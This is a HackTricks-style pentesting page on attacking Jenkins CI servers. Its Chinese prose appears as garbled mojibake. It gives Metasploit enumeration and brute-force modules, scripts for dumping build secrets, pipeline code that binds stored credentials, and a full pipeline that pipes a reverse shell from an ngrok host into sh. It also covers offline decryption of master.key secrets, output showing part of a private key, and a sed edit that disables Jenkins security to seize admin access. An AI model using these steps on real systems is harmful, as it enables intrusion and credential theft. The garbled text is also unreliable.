# Jenkins Security

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## åŸºæœ¬ä¿¡æ¯

Jenkins æ˜¯ä¸€ä¸ªå·¥å…·ï¼Œæä¾›äº†ä¸€ç§ç®€å•çš„æ–¹æ³•æ¥å»ºç«‹å‡ ä¹ä»»ä½•ç¼–ç¨‹è¯­è¨€å’Œæºä»£ç åº“ç»„åˆçš„ **æŒç»­é›†æˆ** æˆ– **æŒç»­äº¤ä»˜** (CI/CD) ç¯å¢ƒï¼Œä½¿ç”¨ç®¡é“ã€‚æ­¤å¤–ï¼Œå®ƒè¿˜è‡ªåŠ¨åŒ–äº†å„ç§å¸¸è§„å¼€å‘ä»»åŠ¡ã€‚è™½ç„¶ Jenkins å¹¶æ²¡æœ‰æ¶ˆé™¤ä¸ºæ¯ä¸ªæ­¥éª¤åˆ›å»ºè„šæœ¬çš„éœ€è¦ï¼Œä½†å®ƒç¡®å®æä¾›äº†ä¸€ç§æ¯”æ‰‹åŠ¨æ„å»ºæ›´å¿«ã€æ›´å¼ºå¤§çš„æ–¹å¼æ¥é›†æˆæ•´ä¸ªæ„å»ºã€æµ‹è¯•å’Œéƒ¨ç½²å·¥å…·çš„åºåˆ—ã€‚

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

## æœªç»èº«ä»½éªŒè¯çš„æšä¸¾

ä¸ºäº†åœ¨æ²¡æœ‰èº«ä»½éªŒè¯çš„æƒ…å†µä¸‹æœç´¢æœ‰è¶£çš„ Jenkins é¡µé¢ï¼ˆå¦‚ _/people_ æˆ– _/asynchPeople_ï¼Œè¿™ä¼šåˆ—å‡ºå½“å‰ç”¨æˆ·ï¼‰ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ï¼š
```
msf> use auxiliary/scanner/http/jenkins_enum
```
æ£€æŸ¥æ‚¨æ˜¯å¦å¯ä»¥åœ¨ä¸éœ€è¦èº«ä»½éªŒè¯çš„æƒ…å†µä¸‹æ‰§è¡Œå‘½ä»¤ï¼š
```
msf> use auxiliary/scanner/http/jenkins_command
```
åœ¨æ²¡æœ‰å‡­æ®çš„æƒ…å†µä¸‹ï¼Œæ‚¨å¯ä»¥æŸ¥çœ‹ _**/asynchPeople/**_ è·¯å¾„æˆ– _**/securityRealm/user/admin/search/index?q=**_ ä»¥è·å– **ç”¨æˆ·å**ã€‚

æ‚¨å¯èƒ½èƒ½å¤Ÿä»è·¯å¾„ _**/oops**_ æˆ– _**/error**_ è·å– Jenkins ç‰ˆæœ¬ã€‚

![](<../../.gitbook/assets/image (146).png>)

### å·²çŸ¥æ¼æ´

{% embed url="https://github.com/gquere/pwn_jenkins" %}

## ç™»å½•

åœ¨åŸºæœ¬ä¿¡æ¯ä¸­ï¼Œæ‚¨å¯ä»¥æ£€æŸ¥ **æ‰€æœ‰ç™»å½• Jenkins çš„æ–¹å¼**ï¼š

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### æ³¨å†Œ

æ‚¨å°†èƒ½å¤Ÿæ‰¾åˆ° **å…è®¸æ‚¨åˆ›å»ºå¸æˆ·å¹¶ç™»å½•çš„ Jenkins å®ä¾‹ã€‚å°±è¿™ä¹ˆç®€å•ã€‚**

### **SSO ç™»å½•**

å¦‚æœ **SSO** **åŠŸèƒ½**/**æ’ä»¶** å­˜åœ¨ï¼Œæ‚¨åº”è¯¥å°è¯•ä½¿ç”¨æµ‹è¯•å¸æˆ·ï¼ˆå³æµ‹è¯• **Github/Bitbucket å¸æˆ·**ï¼‰ç™»å½•åº”ç”¨ç¨‹åºã€‚ä» [**è¿™é‡Œ**](https://emtunc.org/blog/01/2018/research-misconfigured-jenkins-servers/) è·å–æŠ€å·§ã€‚

### æš´åŠ›ç ´è§£

**Jenkins** ç¼ºä¹ **å¯†ç ç­–ç•¥** å’Œ **ç”¨æˆ·åæš´åŠ›ç ´è§£ç¼“è§£**ã€‚å¯¹ç”¨æˆ·è¿›è¡Œ **æš´åŠ›ç ´è§£** æ˜¯è‡³å…³é‡è¦çš„ï¼Œå› ä¸ºå¯èƒ½ä½¿ç”¨ **å¼±å¯†ç ** æˆ– **ç”¨æˆ·åä½œä¸ºå¯†ç **ï¼Œç”šè‡³ **åå‘ç”¨æˆ·åä½œä¸ºå¯†ç **ã€‚
```
msf> use auxiliary/scanner/http/jenkins_login
```
### å¯†ç å–·æ´’

ä½¿ç”¨ [è¿™ä¸ª python è„šæœ¬](https://github.com/gquere/pwn\_jenkins/blob/master/password\_spraying/jenkins\_password\_spraying.py) æˆ– [è¿™ä¸ª powershell è„šæœ¬](https://github.com/chryzsh/JenkinsPasswordSpray)ã€‚

### IP ç™½åå•ç»•è¿‡

è®¸å¤šç»„ç»‡å°† **åŸºäº SaaS çš„æºä»£ç ç®¡ç† (SCM) ç³»ç»Ÿ**ï¼ˆå¦‚ GitHub æˆ– GitLabï¼‰ä¸ **å†…éƒ¨è‡ªæ‰˜ç®¡ CI** è§£å†³æ–¹æ¡ˆï¼ˆå¦‚ Jenkins æˆ– TeamCityï¼‰ç»“åˆä½¿ç”¨ã€‚æ­¤è®¾ç½®å…è®¸ CI ç³»ç»Ÿ **æ¥æ”¶æ¥è‡ª SaaS æºä»£ç ä¾›åº”å•†çš„ webhook äº‹ä»¶**ï¼Œä¸»è¦ç”¨äºè§¦å‘ç®¡é“ä½œä¸šã€‚

ä¸ºäº†å®ç°è¿™ä¸€ç‚¹ï¼Œç»„ç»‡ **å°† SCM å¹³å°çš„ IP èŒƒå›´åˆ—å…¥ç™½åå•**ï¼Œå…è®¸å®ƒä»¬é€šè¿‡ **webhooks** è®¿é—® **å†…éƒ¨ CI ç³»ç»Ÿ**ã€‚ç„¶è€Œï¼Œé‡è¦çš„æ˜¯è¦æ³¨æ„ï¼Œ**ä»»ä½•äºº**éƒ½å¯ä»¥åœ¨ GitHub æˆ– GitLab ä¸Šåˆ›å»ºä¸€ä¸ª **è´¦æˆ·** å¹¶å°†å…¶é…ç½®ä¸º **è§¦å‘ webhook**ï¼Œå¯èƒ½ä¼šå‘ **å†…éƒ¨ CI ç³»ç»Ÿ** å‘é€è¯·æ±‚ã€‚

æ£€æŸ¥: [https://www.paloaltonetworks.com/blog/prisma-cloud/repository-webhook-abuse-access-ci-cd-systems-at-scale/](https://www.paloaltonetworks.com/blog/prisma-cloud/repository-webhook-abuse-access-ci-cd-systems-at-scale/)

## å†…éƒ¨ Jenkins æ»¥ç”¨

åœ¨è¿™äº›åœºæ™¯ä¸­ï¼Œæˆ‘ä»¬å‡è®¾æ‚¨æœ‰ä¸€ä¸ªæœ‰æ•ˆçš„è´¦æˆ·æ¥è®¿é—® Jenkinsã€‚

{% hint style="warning" %}
æ ¹æ® Jenkins ä¸­é…ç½®çš„ **æˆæƒ** æœºåˆ¶å’Œè¢«æ”»é™·ç”¨æˆ·çš„æƒé™ï¼Œæ‚¨ **å¯èƒ½èƒ½å¤Ÿæˆ–æ— æ³•æ‰§è¡Œä»¥ä¸‹æ”»å‡»ã€‚**
{% endhint %}

æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹åŸºæœ¬ä¿¡æ¯ï¼š

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### åˆ—å‡ºç”¨æˆ·

å¦‚æœæ‚¨å·²è®¿é—® Jenkinsï¼Œæ‚¨å¯ä»¥åœ¨ [http://127.0.0.1:8080/asynchPeople/](http://127.0.0.1:8080/asynchPeople/) åˆ—å‡ºå…¶ä»–æ³¨å†Œç”¨æˆ·ã€‚

### è½¬å‚¨æ„å»ºä»¥æŸ¥æ‰¾æ˜æ–‡ç§˜å¯†

ä½¿ç”¨ [è¿™ä¸ªè„šæœ¬](https://github.com/gquere/pwn\_jenkins/blob/master/dump\_builds/jenkins\_dump\_builds.py) è½¬å‚¨æ„å»ºæ§åˆ¶å°è¾“å‡ºå’Œæ„å»ºç¯å¢ƒå˜é‡ï¼Œä»¥å¸Œæœ›æ‰¾åˆ°æ˜æ–‡ç§˜å¯†ã€‚
```bash
python3 jenkins_dump_builds.py -u alice -p alice http://127.0.0.1:8080/ -o build_dumps
cd build_dumps
gitleaks detect --no-git -v
```
### **çªƒå– SSH å‡­è¯**

å¦‚æœè¢«æ”»å‡»çš„ç”¨æˆ·å…·æœ‰ **è¶³å¤Ÿçš„æƒé™æ¥åˆ›å»º/ä¿®æ”¹æ–°çš„ Jenkins èŠ‚ç‚¹**ï¼Œå¹¶ä¸” SSH å‡­è¯å·²ç»å­˜å‚¨ä»¥è®¿é—®å…¶ä»–èŠ‚ç‚¹ï¼Œä»–å¯ä»¥é€šè¿‡åˆ›å»º/ä¿®æ”¹ä¸€ä¸ªèŠ‚ç‚¹å¹¶ **è®¾ç½®ä¸€ä¸ªå°†è®°å½•å‡­è¯çš„ä¸»æœº** è€Œä¸éªŒè¯ä¸»æœºå¯†é’¥æ¥ **çªƒå–è¿™äº›å‡­è¯**ï¼š

![](<../../.gitbook/assets/image (218).png>)

æ‚¨é€šå¸¸å¯ä»¥åœ¨ **å…¨å±€æä¾›è€…** (`/credentials/`) ä¸­æ‰¾åˆ° Jenkins ssh å‡­è¯ï¼Œå› æ­¤æ‚¨ä¹Ÿå¯ä»¥åƒè½¬å‚¨ä»»ä½•å…¶ä»–ç§˜å¯†ä¸€æ ·è½¬å‚¨å®ƒä»¬ã€‚æ›´å¤šä¿¡æ¯è¯·å‚è§ [**è½¬å‚¨ç§˜å¯†éƒ¨åˆ†**](./#dumping-secrets)ã€‚

### **Jenkins ä¸­çš„ RCE**

åœ¨ Jenkins æœåŠ¡å™¨ä¸Šè·å– **shell** ä½¿æ”»å‡»è€…æœ‰æœºä¼šæ³„éœ²æ‰€æœ‰ **ç§˜å¯†** å’Œ **ç¯å¢ƒå˜é‡**ï¼Œå¹¶ **åˆ©ç”¨åŒä¸€ç½‘ç»œä¸­çš„å…¶ä»–æœºå™¨**ï¼Œç”šè‡³ **æ”¶é›†äº‘å‡­è¯**ã€‚

é»˜è®¤æƒ…å†µä¸‹ï¼ŒJenkins å°† **ä»¥ SYSTEM èº«ä»½è¿è¡Œ**ã€‚å› æ­¤ï¼Œæ”»é™·å®ƒå°†ä½¿æ”»å‡»è€…è·å¾— **SYSTEM æƒé™**ã€‚

### **åˆ›å»º/ä¿®æ”¹é¡¹ç›®çš„ RCE**

åˆ›å»º/ä¿®æ”¹é¡¹ç›®æ˜¯è·å¾— Jenkins æœåŠ¡å™¨ RCE çš„ä¸€ç§æ–¹å¼ï¼š

{% content-ref url="jenkins-rce-creating-modifying-project.md" %}
[jenkins-rce-creating-modifying-project.md](jenkins-rce-creating-modifying-project.md)
{% endcontent-ref %}

### **æ‰§è¡Œ Groovy è„šæœ¬çš„ RCE**

æ‚¨è¿˜å¯ä»¥é€šè¿‡æ‰§è¡Œ Groovy è„šæœ¬æ¥è·å¾— RCEï¼Œè¿™å¯èƒ½æ¯”åˆ›å»ºæ–°é¡¹ç›®æ›´éšè”½ï¼š

{% content-ref url="jenkins-rce-with-groovy-script.md" %}
[jenkins-rce-with-groovy-script.md](jenkins-rce-with-groovy-script.md)
{% endcontent-ref %}

### åˆ›å»º/ä¿®æ”¹ç®¡é“çš„ RCE

æ‚¨è¿˜å¯ä»¥é€šè¿‡ **åˆ›å»º/ä¿®æ”¹ç®¡é“** æ¥è·å¾— **RCE**ï¼š

{% content-ref url="jenkins-rce-creating-modifying-pipeline.md" %}
[jenkins-rce-creating-modifying-pipeline.md](jenkins-rce-creating-modifying-pipeline.md)
{% endcontent-ref %}

## ç®¡é“åˆ©ç”¨

è¦åˆ©ç”¨ç®¡é“ï¼Œæ‚¨ä»ç„¶éœ€è¦è®¿é—® Jenkinsã€‚

### æ„å»ºç®¡é“

**ç®¡é“** ä¹Ÿå¯ä»¥ç”¨ä½œ **é¡¹ç›®ä¸­çš„æ„å»ºæœºåˆ¶**ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¯ä»¥é…ç½®ä¸€ä¸ª **å­˜å‚¨åº“ä¸­çš„æ–‡ä»¶**ï¼Œè¯¥æ–‡ä»¶å°†åŒ…å«ç®¡é“è¯­æ³•ã€‚é»˜è®¤æƒ…å†µä¸‹ä½¿ç”¨ `/Jenkinsfile`ï¼š

![](<../../.gitbook/assets/image (127).png>)

è¿˜å¯ä»¥ **å°†ç®¡é“é…ç½®æ–‡ä»¶å­˜å‚¨åœ¨å…¶ä»–åœ°æ–¹**ï¼ˆä¾‹å¦‚åœ¨å…¶ä»–å­˜å‚¨åº“ä¸­ï¼‰ï¼Œç›®çš„æ˜¯ **åˆ†ç¦»** å­˜å‚¨åº“ **è®¿é—®** å’Œç®¡é“è®¿é—®ã€‚

å¦‚æœæ”»å‡»è€…å¯¹è¯¥æ–‡ä»¶å…·æœ‰ **å†™å…¥æƒé™**ï¼Œä»–å°†èƒ½å¤Ÿ **ä¿®æ”¹** å®ƒå¹¶ **æ½œåœ¨è§¦å‘** ç®¡é“ï¼Œè€Œæ— éœ€è®¿é—® Jenkinsã€‚\
æ”»å‡»è€…å¯èƒ½éœ€è¦ **ç»•è¿‡ä¸€äº›åˆ†æ”¯ä¿æŠ¤**ï¼ˆæ ¹æ®å¹³å°å’Œç”¨æˆ·æƒé™ï¼Œè¿™äº›ä¿æŠ¤å¯èƒ½ä¼šè¢«ç»•è¿‡æˆ–ä¸è¢«ç»•è¿‡ï¼‰ã€‚

æ‰§è¡Œè‡ªå®šä¹‰ç®¡é“çš„æœ€å¸¸è§è§¦å‘å™¨æ˜¯ï¼š

* **å‘ä¸»åˆ†æ”¯å‘èµ·æ‹‰å–è¯·æ±‚**ï¼ˆæˆ–å¯èƒ½å‘å…¶ä»–åˆ†æ”¯ï¼‰
* **æ¨é€åˆ°ä¸»åˆ†æ”¯**ï¼ˆæˆ–å¯èƒ½æ¨é€åˆ°å…¶ä»–åˆ†æ”¯ï¼‰
* **æ›´æ–°ä¸»åˆ†æ”¯** å¹¶ç­‰å¾…ä»¥æŸç§æ–¹å¼æ‰§è¡Œ

{% hint style="info" %}
å¦‚æœæ‚¨æ˜¯ **å¤–éƒ¨ç”¨æˆ·**ï¼Œæ‚¨ä¸åº”è¯¥æœŸæœ›åˆ›å»º **PR åˆ°å…¶ä»–ç”¨æˆ·/ç»„ç»‡çš„ä¸»åˆ†æ”¯** å¹¶ **è§¦å‘ç®¡é“**... ä½†å¦‚æœé…ç½® **ä¸å½“**ï¼Œæ‚¨å¯èƒ½ä¼šé€šè¿‡åˆ©ç”¨è¿™ä¸€ç‚¹å®Œå…¨ **æ”»é™·å…¬å¸**ã€‚
{% endhint %}

### ç®¡é“ RCE

åœ¨ä¹‹å‰çš„ RCE éƒ¨åˆ†ä¸­å·²ç»æŒ‡æ˜äº†ä¸€ç§æŠ€æœ¯æ¥ [**é€šè¿‡ä¿®æ”¹ç®¡é“è·å– RCE**](./#rce-creating-modifying-pipeline)ã€‚

### æ£€æŸ¥ç¯å¢ƒå˜é‡

å¯ä»¥ä¸ºæ•´ä¸ªç®¡é“æˆ–ç‰¹å®šé˜¶æ®µå£°æ˜ **æ˜æ–‡ç¯å¢ƒå˜é‡**ã€‚è¿™äº›ç¯å¢ƒå˜é‡ **ä¸åº”åŒ…å«æ•æ„Ÿä¿¡æ¯**ï¼Œä½†æ”»å‡»è€…å§‹ç»ˆå¯ä»¥ **æ£€æŸ¥æ‰€æœ‰ç®¡é“** é…ç½®/Jenkinsfilesï¼š
```bash
pipeline {
agent {label 'built-in'}
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
```
### Dumping secrets

æœ‰å…³Jenkinsé€šå¸¸å¦‚ä½•å¤„ç†ç§˜å¯†çš„ä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹åŸºæœ¬ä¿¡æ¯ï¼š

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

å‡­æ®å¯ä»¥**ä½œç”¨äºå…¨å±€æä¾›è€…**ï¼ˆ`/credentials/`ï¼‰æˆ–**ç‰¹å®šé¡¹ç›®**ï¼ˆ`/job/<project-name>/configure`ï¼‰ã€‚å› æ­¤ï¼Œä¸ºäº†æå–æ‰€æœ‰å‡­æ®ï¼Œæ‚¨éœ€è¦**è‡³å°‘å¦¥åæ‰€æœ‰åŒ…å«ç§˜å¯†çš„é¡¹ç›®**å¹¶æ‰§è¡Œè‡ªå®šä¹‰/è¢«æ±¡æŸ“çš„ç®¡é“ã€‚

è¿˜æœ‰å¦ä¸€ä¸ªé—®é¢˜ï¼Œä¸ºäº†åœ¨ç®¡é“çš„**env**ä¸­è·å–**ç§˜å¯†**ï¼Œæ‚¨éœ€è¦**çŸ¥é“ç§˜å¯†çš„åç§°å’Œç±»å‹**ã€‚ä¾‹å¦‚ï¼Œå¦‚æœæ‚¨å°è¯•å°†**`usernamePassword`** **ç§˜å¯†**ä½œä¸º**`string`** **ç§˜å¯†**åŠ è½½ï¼Œæ‚¨å°†æ”¶åˆ°æ­¤**é”™è¯¯**ï¼š
```
ERROR: Credentials 'flag2' is of type 'Username with password' where 'org.jenkinsci.plugins.plaincredentials.StringCredentials' was expected
```
è¿™é‡Œæ˜¯åŠ è½½ä¸€äº›å¸¸è§ç§˜å¯†ç±»å‹çš„æ–¹æ³•ï¼š
```bash
withCredentials([usernamePassword(credentialsId: 'flag2', usernameVariable: 'USERNAME', passwordVariable: 'PASS')]) {
sh '''
env #Search for USERNAME and PASS
'''
}

withCredentials([string(credentialsId: 'flag1', variable: 'SECRET')]) {
sh '''
env #Search for SECRET
'''
}

withCredentials([usernameColonPassword(credentialsId: 'mylogin', variable: 'USERPASS')]) {
sh '''
env # Search for USERPASS
'''
}

# You can also load multiple env variables at once
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
env
'''
}
```
åœ¨æœ¬é¡µé¢çš„æœ«å°¾ï¼Œæ‚¨å¯ä»¥**æ‰¾åˆ°æ‰€æœ‰å‡­è¯ç±»å‹**ï¼š[https://www.jenkins.io/doc/pipeline/steps/credentials-binding/](https://www.jenkins.io/doc/pipeline/steps/credentials-binding/)

{% hint style="warning" %}
è·å–æ‰€æœ‰ç§˜å¯†çš„æœ€ä½³æ–¹æ³•æ˜¯**å¦¥å****Jenkins**æœºå™¨ï¼ˆä¾‹å¦‚åœ¨**å†…ç½®èŠ‚ç‚¹**ä¸­è¿è¡Œåå‘ shellï¼‰ï¼Œç„¶å**æ³„éœ²****ä¸»å¯†é’¥**å’Œ**åŠ å¯†ç§˜å¯†**å¹¶ç¦»çº¿è§£å¯†å®ƒä»¬ã€‚\
æœ‰å…³å¦‚ä½•æ‰§è¡Œæ­¤æ“ä½œçš„æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚è§[èŠ‚ç‚¹å’Œä»£ç†éƒ¨åˆ†](./#nodes-and-agents)å’Œ[åæœŸåˆ©ç”¨éƒ¨åˆ†](./#post-exploitation)ã€‚
{% endhint %}

### è§¦å‘å™¨

æ¥è‡ª[æ–‡æ¡£](https://www.jenkins.io/doc/book/pipeline/syntax/#triggers)ï¼š`triggers`æŒ‡ä»¤å®šä¹‰äº†**ç®¡é“åº”é‡æ–°è§¦å‘çš„è‡ªåŠ¨æ–¹å¼**ã€‚å¯¹äºä¸ GitHub æˆ– BitBucket ç­‰æºé›†æˆçš„ç®¡é“ï¼Œ`triggers`å¯èƒ½ä¸æ˜¯å¿…éœ€çš„ï¼Œå› ä¸ºåŸºäº webhook çš„é›†æˆå¯èƒ½å·²ç»å­˜åœ¨ã€‚ç›®å‰å¯ç”¨çš„è§¦å‘å™¨æœ‰`cron`ã€`pollSCM`å’Œ`upstream`ã€‚

Cron ç¤ºä¾‹ï¼š
```bash
triggers { cron('H */4 * * 1-5') }
```
æ£€æŸ¥ **æ–‡æ¡£ä¸­çš„å…¶ä»–ç¤ºä¾‹**ã€‚

### èŠ‚ç‚¹ä¸ä»£ç†

ä¸€ä¸ª **Jenkins å®ä¾‹** å¯èƒ½åœ¨ **ä¸åŒçš„æœºå™¨ä¸Šè¿è¡Œä¸åŒçš„ä»£ç†**ã€‚ä»æ”»å‡»è€…çš„è§’åº¦æ¥çœ‹ï¼Œè®¿é—®ä¸åŒçš„æœºå™¨æ„å‘³ç€ **ä¸åŒçš„æ½œåœ¨äº‘å‡­è¯** å¯ä»¥è¢«çªƒå–æˆ– **ä¸åŒçš„ç½‘ç»œè®¿é—®** å¯èƒ½è¢«æ»¥ç”¨ä»¥åˆ©ç”¨å…¶ä»–æœºå™¨ã€‚

æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹åŸºæœ¬ä¿¡æ¯ï¼š

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

æ‚¨å¯ä»¥åœ¨ `/computer/` ä¸­æšä¸¾ **é…ç½®çš„èŠ‚ç‚¹**ï¼Œé€šå¸¸ä¼šæ‰¾åˆ° **`å†…ç½®èŠ‚ç‚¹`**ï¼ˆå³è¿è¡Œ Jenkins çš„èŠ‚ç‚¹ï¼‰ä»¥åŠå¯èƒ½æ›´å¤šï¼š

![](<../../.gitbook/assets/image (249).png>)

**æ”»é™·å†…ç½®èŠ‚ç‚¹** ç‰¹åˆ«æœ‰è¶£ï¼Œå› ä¸ºå®ƒåŒ…å«æ•æ„Ÿçš„ Jenkins ä¿¡æ¯ã€‚

è¦æŒ‡ç¤ºæ‚¨æƒ³åœ¨ **å†…ç½® Jenkins èŠ‚ç‚¹** ä¸­ **è¿è¡Œ** **ç®¡é“**ï¼Œæ‚¨å¯ä»¥åœ¨ç®¡é“ä¸­æŒ‡å®šä»¥ä¸‹é…ç½®ï¼š
```bash
pipeline {
agent {label 'built-in'}
```
### å®Œæ•´ç¤ºä¾‹

åœ¨ç‰¹å®šä»£ç†ä¸­çš„ç®¡é“ï¼Œå¸¦æœ‰ cron è§¦å‘å™¨ï¼Œå…·æœ‰ç®¡é“å’Œé˜¶æ®µç¯å¢ƒå˜é‡ï¼Œåœ¨ä¸€ä¸ªæ­¥éª¤ä¸­åŠ è½½ 2 ä¸ªå˜é‡å¹¶å‘é€åå‘ shellï¼š
```bash
pipeline {
agent {label 'built-in'}
triggers { cron('H */4 * * 1-5') }
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
curl https://reverse-shell.sh/0.tcp.ngrok.io:16287 | sh PASS
'''
}
}
}

post {
always {
cleanWs()
}
}
}
```
## ä»»æ„æ–‡ä»¶è¯»å–åˆ° RCE

{% content-ref url="jenkins-arbitrary-file-read-to-rce-via-remember-me.md" %}
[jenkins-arbitrary-file-read-to-rce-via-remember-me.md](jenkins-arbitrary-file-read-to-rce-via-remember-me.md)
{% endcontent-ref %}

## RCE

{% content-ref url="jenkins-rce-with-groovy-script.md" %}
[jenkins-rce-with-groovy-script.md](jenkins-rce-with-groovy-script.md)
{% endcontent-ref %}

{% content-ref url="jenkins-rce-creating-modifying-project.md" %}
[jenkins-rce-creating-modifying-project.md](jenkins-rce-creating-modifying-project.md)
{% endcontent-ref %}

{% content-ref url="jenkins-rce-creating-modifying-pipeline.md" %}
[jenkins-rce-creating-modifying-pipeline.md](jenkins-rce-creating-modifying-pipeline.md)
{% endcontent-ref %}

## åˆ©ç”¨å

### Metasploit
```
msf> post/multi/gather/jenkins_gather
```
### Jenkins Secrets

æ‚¨å¯ä»¥é€šè¿‡è®¿é—® `/credentials/` åˆ—å‡ºç§˜å¯†ï¼Œå¦‚æœæ‚¨æ‹¥æœ‰è¶³å¤Ÿçš„æƒé™ã€‚è¯·æ³¨æ„ï¼Œè¿™åªä¼šåˆ—å‡º `credentials.xml` æ–‡ä»¶ä¸­çš„ç§˜å¯†ï¼Œä½† **æ„å»ºé…ç½®æ–‡ä»¶** å¯èƒ½è¿˜æœ‰ **æ›´å¤šå‡­æ®**ã€‚

å¦‚æœæ‚¨å¯ä»¥ **æŸ¥çœ‹æ¯ä¸ªé¡¹ç›®çš„é…ç½®**ï¼Œæ‚¨ä¹Ÿå¯ä»¥åœ¨å…¶ä¸­çœ‹åˆ°ç”¨äºè®¿é—®å­˜å‚¨åº“çš„ **å‡­æ®åç§°ï¼ˆç§˜å¯†ï¼‰** ä»¥åŠ **é¡¹ç›®çš„å…¶ä»–å‡­æ®**ã€‚

![](<../../.gitbook/assets/image (180).png>)

#### From Groovy

{% content-ref url="jenkins-dumping-secrets-from-groovy.md" %}
[jenkins-dumping-secrets-from-groovy.md](jenkins-dumping-secrets-from-groovy.md)
{% endcontent-ref %}

#### From disk

è¿™äº›æ–‡ä»¶ç”¨äº **è§£å¯† Jenkins ç§˜å¯†**ï¼š

* secrets/master.key
* secrets/hudson.util.Secret

è¿™æ ·çš„ **ç§˜å¯†é€šå¸¸å¯ä»¥åœ¨**ï¼š

* credentials.xml
* jobs/.../build.xml
* jobs/.../config.xml

è¿™æ˜¯ä¸€ä¸ªæŸ¥æ‰¾å®ƒä»¬çš„æ­£åˆ™è¡¨è¾¾å¼ï¼š
```bash
# Find the secrets
grep -re "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"
# Print only the filenames where the secrets are located
grep -lre "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"

# Secret example
credentials.xml: <secret>{AQAAABAAAAAwsSbQDNcKIRQMjEMYYJeSIxi2d3MHmsfW3d1Y52KMOmZ9tLYyOzTSvNoTXdvHpx/kkEbRZS9OYoqzGsIFXtg7cw==}</secret>
```
#### ç¦»çº¿è§£å¯†Jenkinsç§˜å¯†

å¦‚æœæ‚¨å·²ç»è½¬å‚¨äº† **è§£å¯†ç§˜å¯†æ‰€éœ€çš„å¯†ç **ï¼Œè¯·ä½¿ç”¨ [**è¿™ä¸ªè„šæœ¬**](https://github.com/gquere/pwn\_jenkins/blob/master/offline\_decryption/jenkins\_offline\_decrypt.py) **æ¥è§£å¯†è¿™äº›ç§˜å¯†**ã€‚
```bash
python3 jenkins_offline_decrypt.py master.key hudson.util.Secret cred.xml
06165DF2-C047-4402-8CAB-1C8EC526C115
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAt985Hbb8KfIImS6dZlVG6swiotCiIlg/P7aME9PvZNUgg2Iyf2FT
```
#### ä» Groovy è§£å¯† Jenkins ç§˜å¯†
```bash
println(hudson.util.Secret.decrypt("{...}"))
```
### åˆ›å»ºæ–°ç®¡ç†å‘˜ç”¨æˆ·

1. è®¿é—® Jenkins config.xml æ–‡ä»¶åœ¨ `/var/lib/jenkins/config.xml` æˆ– `C:\Program Files (x86)\Jenkins\`
2. æœç´¢è¯ `<useSecurity>true</useSecurity>` å¹¶å°† **`true`** æ”¹ä¸º **`false`**ã€‚
1. `sed -i -e 's/<useSecurity>true</<useSecurity>false</g' config.xml`
3. **é‡å¯** **Jenkins** æœåŠ¡å™¨: `service jenkins restart`
4. ç°åœ¨å†æ¬¡è®¿é—® Jenkins é—¨æˆ·ï¼Œ**Jenkins è¿™æ¬¡ä¸ä¼šè¦æ±‚ä»»ä½•å‡­æ®**ã€‚æ‚¨å¯ä»¥å¯¼èˆªåˆ° "**ç®¡ç† Jenkins**" ä»¥é‡æ–°è®¾ç½® **ç®¡ç†å‘˜å¯†ç **ã€‚
5. é€šè¿‡å°†è®¾ç½®æ›´æ”¹ä¸º `<useSecurity>true</useSecurity>` å†æ¬¡ **å¯ç”¨** **å®‰å…¨æ€§**ï¼Œå¹¶ **å†æ¬¡é‡å¯ Jenkins**ã€‚

## å‚è€ƒæ–‡çŒ®

* [https://github.com/gquere/pwn\_jenkins](https://github.com/gquere/pwn\_jenkins)
* [https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/](https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/)
